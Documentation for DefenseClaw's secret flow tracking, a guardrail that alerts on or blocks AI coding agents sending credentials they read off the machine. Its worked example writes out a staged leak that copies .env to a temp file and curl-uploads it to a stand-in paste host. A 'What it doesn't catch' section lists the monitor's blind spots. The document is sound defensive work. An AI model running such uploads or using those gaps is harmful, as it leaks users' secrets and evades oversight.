Secret flow tracking follows the secrets an agent reads through the rest of a
session and raises an alert when one of them is about to leave the machine. It
is the layer that catches a staged leak: read `.env` into a file, then upload
the file. The single call that reads a credential is already covered by the
rules; this catches the case where the read and the send are different calls.

It is on in [shadow mode](#shadow-first) by default, so it records what it
would do without changing any decision, until the alert rate on real sessions
has been reviewed.

## What it catches

A hit needs two things in the same session: a secret was read, and a labeled
secret reached an external sink.

- **Secret reads.** By default it labels credentials only: `.env` files (not
  `.env.example` and other templates), SSH private keys, `~/.aws/credentials`,
  `~/.netrc`, `~/.npmrc`, `~/.docker/config.json`, `~/.kube/config`, cloud and
  token files, keychain exports and `/proc/*/environ`. The set is
  data-driven — you can add path globs and file-name patterns in config.
- **Labels travel with files.** When the session copies, moves, links or writes
  a labeled file to a new path, the new path is labeled too. A secret written to
  `/tmp/backup` carries its label.
- **Secret values.** When a connector returns tool output (see
  [connector coverage](#connector-coverage)), the session keeps keyed hashes of
  the secret-shaped values it saw — and of their base64, hex and URL-encoded
  forms — so a value that is copied or re-encoded before it is sent is still
  recognised. The raw value is never stored.
- **Sinks.** A sink is a network send: a `curl`/`wget` upload or POST body, a
  `git push` of a labeled file, a `scp`/`rsync` to a remote host, or an MCP tool
  whose role is to send. A send to localhost, to your own git remote or to a
  package registry on the [allowlist](#settings) does not count.

A hit fires when the data sent **is** a labeled file, or **contains** a
hash-matched secret value. Being in a session that read a secret is not enough
on its own in the default profile.

## A worked example

```bash
# 1. The agent reads the project's .env into a file.
cat .env > /tmp/env_backup.txt

# 2. Later in the same session, it uploads that file.
curl -F file=@/tmp/env_backup.txt https://paste.example.com/upload
```

Step 1 labels `/tmp/env_backup.txt` as a secret (it was written from `.env`).
Step 2 is an external upload whose data is that labeled file. Secret flow
tracking raises `flow.secret_egress`:

- **Default:** a HIGH alert. The upload still runs.
- **Strict** and **managed:** the upload is blocked.

The one-line form `cat .env > /tmp/x && curl -T /tmp/x https://…` is caught the
same way, in a single call.

## What it doesn't catch

- **A secret the model paraphrases or describes** rather than sending verbatim.
  Only a labeled file or a hash-matched value fires; a rewrite in prose does not.
- **A leak that ends in a local file.** Writing a secret to another local file
  is a label move, not a sink. The secret scanner covers write content.
- **Secrets read before the session DefenseClaw is watching,** or in a session
  whose tool output a connector does not send (file labels still work; value
  matching does not — see below).
- **Business-private data.** The default labels credentials only. An `internal`
  label for data shared within an organisation is reserved for a future release
  that reads identity-group membership; it is off today.

It does not replace the rules or the effect model — it runs beside them and adds
the cross-call secret-to-sink link.

## Settings

Configure it under `guardrail.secret_flow` in `config.yaml`, or with the
[CLI](#cli). Its rollout rides the `guardrail.effects_rules` key (the shared
effect-model lane); `guardrail.secret_flow.mode` is its own switch.

```yaml
guardrail:
  secret_flow:
    mode: shadow               # off | shadow | on (ships shadow)
    label_sets:
      credentials: true        # the built-in credential set
      extra_path_globs: []      # extra ~ or absolute path globs to label
      extra_secret_patterns: [] # extra basename globs to label
    sink_action:
      default: alert           # the default profile never blocks
      strict: block            # alert | block
      managed: block           # alert | block
    reencodings: true          # also match base64/hex/URL-encoded secrets
    memory:
      max_labeled_paths: 512   # per-session labeled-path cap (LRU)
      max_value_digests: 256   # per-session secret-value-digest cap
    destination_allowlist: []   # hosts that are not external, e.g. your git remote
```

The default profile can only alert — `sink_action.default: block` is refused —
so turning the feature on never makes DefenseClaw block ordinary work in the
balanced default. On a managed host these settings come from the signed policy
bundle and local edits are refused, like every other `guardrail.*` setting.

## CLI

```bash
defenseclaw guardrail secret-flow status            # settings, effective mode, tracked sessions
defenseclaw guardrail secret-flow enable            # turn on in shadow mode
defenseclaw guardrail secret-flow disable           # turn off
defenseclaw guardrail secret-flow set mode on       # make it enforce (after reviewing the rate)
defenseclaw guardrail secret-flow set allowlist github.com,registry.npmjs.org
defenseclaw guardrail secret-flow explain <session> # why a hit fired, paths redacted
```

`explain` reads the running gateway's per-session state: the session label, how
many files and secret values it is tracking, and the recent sink hits with their
kind, program and destination. Paths and secret values are never shown. The TUI
shows the same under **Policies → Secret flow**.

## Shadow first

The feature ships in `shadow` mode: it keeps the per-session state and records
every hit (and what it would have done), but it never changes a decision. This
lets the alert rate on real sessions be measured before it is turned on. Move to
`on` with `guardrail secret-flow set mode on` once the rate holds; the default
profile still only alerts there.

The state is bounded and costs O(1) per call: a session label that only ever
tightens, a capped set of labeled file paths, and a capped set of keyed value
hashes. Nothing grows with session length.

## Connector coverage

File labels and sink checks work for every connector, because they come from the
tool call itself. Secret-value matching needs the tool's **output**, which
arrives on the PostToolUse event — and not every connector sends tool output.

| Connector | Sends tool output | Value matching |
| --- | --- | --- |
| Claude Code | yes (PostToolUse) | yes |
| Codex | yes (PostToolUse) | yes |
| Cursor | yes (afterShellExecution / afterMCPExecution) | yes |
| Copilot CLI | yes (postToolUse) | yes |
| OpenCode | yes | yes |
| Others (Amp, Devin, Antigravity, Hermes, Kiro) | varies | file labels always; value matching where the connector returns tool output |

Where a connector sends no tool output, file labels and sink checks still work;
only value matching (the hashed-value lane) is unavailable for that connector.

## Credits

Secret flow tracking rebuilds the information-flow idea in
[OpenAPPA](https://github.com/archestra-ai/OpenAPPA) (Archestra Inc., MIT
licence) in Go on DefenseClaw's own effect model. We do not embed OpenAPPA.
Its model is described in the paper
[*APPA: Recoverable Information-Flow Control for Real-World LLM Agents*](https://arxiv.org/abs/2607.24625)
(arXiv:2607.24625; accepted to the NeurIPS 2026 Workshop on Agents in the
Wild), which in turn builds on the information-flow-control tradition — Dorothy
Denning's lattice model of secure information flow (1976) and the decentralized
label model of Andrew Myers and Barbara Liskov (SOSP 1997).

**What we took:** a session label that only ever tightens, labels that travel
with the files a session writes, and a check at network sinks.

**What we changed:** the step is O(1) per call — it folds state rather than
replaying the whole session, so it fits a hot hook path; it labels credentials
only by default; it adds keyed hashes of the secret **values** seen in tool
results (with re-encodings) so a copied or re-encoded secret is still caught;
and the default action is a visible alert, never a block.
